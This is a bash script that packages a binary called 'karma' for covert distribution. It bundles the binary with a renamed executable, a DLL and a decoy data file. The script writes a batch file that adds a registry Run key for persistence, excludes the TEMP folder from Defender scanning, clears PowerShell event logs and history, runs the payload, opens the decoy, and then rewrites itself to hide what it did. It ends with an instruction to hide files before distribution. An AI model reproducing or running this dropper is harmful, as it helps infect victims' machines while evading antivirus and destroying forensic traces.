#!/bin/bash
set -e


BIN_PATH=$1 # Path to karma binary to deploy
ARCHIVE=$2 # Archive name
DATA_PATH=$4 # path to dummy data

[ -f "$BIN_PATH" ] || { echo "error: $BIN_PATH does not exist."; exit 1; }
[ -f "$DATA_PATH" ] || { echo "error: $DATA_PATH does not exist."; exit 1; }

OLDDIR=$PWD
cp $BIN_PATH $(dirname $0)
cp $DATA_PATH $(dirname $0)
cd $(dirname $0)

mkdir $ARCHIVE 
cp bthudtask.exe ${ARCHIVE}.exe
mv ${ARCHIVE}.exe $ARCHIVE
cp DEVOBJ.dll $ARCHIVE

BIN=$(basename $BIN_PATH)
DATA=$(basename $DATA_PATH)
PROGRAM_NAME=$(echo $BIN | cut -d. -f1 )

mv $BIN $ARCHIVE
mv $DATA $ARCHIVE

# move pe to temp folder
echo "move $BIN %TEMP%\\$BIN" > data.bat
# add registry run key for for pe
echo "reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" /v $PROGRAM_NAME /t REG_SZ /d \"%TEMP%\\$BIN\"" >> data.bat
# clear doskey history (just in case)
echo "doskey /listsize=0" >> data.bat
# set temp folder as exclusion path
echo 'powershell -c Add-MpPreference -ExclusionPath $Env:TEMP' >> data.bat
# clear powershell event logs
echo "powershell -c Clear-EventLog \"Windows PowerShell\"" >> data.bat
# clear powershell history
echo "powershell -c Remove-Item (Get-PSReadlineOption).HistorySavePath" >> data.bat
# start pe
echo "%TEMP%\\$BIN" >> data.bat
# start dummy data
echo "start $DATA" >> data.bat
# rewrite file to only start dummy data whenever program is run
echo "echo start $DATA> data.bat" >> data.bat
mv data.bat $ARCHIVE

mv ${ARCHIVE} $OLDDIR

echo "folder saved at ./${ARCHIVE}/"
echo "make appropriate files hidden before distribution!"